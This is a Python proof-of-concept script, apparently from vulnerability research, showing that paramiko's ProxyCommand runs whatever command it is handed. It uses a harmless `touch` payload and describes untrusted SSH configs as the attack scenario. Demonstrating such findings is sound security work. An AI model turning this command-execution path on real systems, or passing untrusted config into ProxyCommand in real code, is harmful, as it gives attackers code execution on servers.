"""
Real, file-backed proof of the paramiko CWE-78 finding -- no harness, no
sandbox. Calls the REAL, installed paramiko library's REAL
ProxyCommand.__init__ (the exact function mined and confirmed TRIGGERED:
paramiko/proxy.py, which internally reaches subprocess.Popen(self.cmd, ...)
after shlex.split()-ing whatever command_line you hand it).

Realistic vulnerable scenario: an app lets a user supply an SSH config
(an uploaded ssh_config file, a "jump host" field in some web UI, a
per-project config stored in a database) and passes the ProxyCommand
value straight to paramiko to set up the connection -- exactly the kind
of config-driven value that's easy to forget is attacker-controlled.

Run: python3 real_proxycommand_demo.py
Then inspect the result yourself:
    cat pwned_proxycmd_proof.txt
"""
import os
import paramiko.proxy

PROOF_FILE = os.path.abspath("pwned_proxycmd_proof.txt")
if os.path.exists(PROOF_FILE):
    os.remove(PROOF_FILE)

# Attacker-controlled ProxyCommand value from an untrusted SSH config.
attacker_command_line = f"touch {PROOF_FILE}"

print(f"Calling the REAL paramiko.proxy.ProxyCommand() with:\n  command_line={attacker_command_line!r}\n")

proxy = paramiko.proxy.ProxyCommand(attacker_command_line)
proxy.process.wait(timeout=5)  # let the real subprocess actually finish

print(f"Done. Real file written to: {PROOF_FILE}")
print("Verify it yourself:")
print(f"  ls -la {PROOF_FILE}")
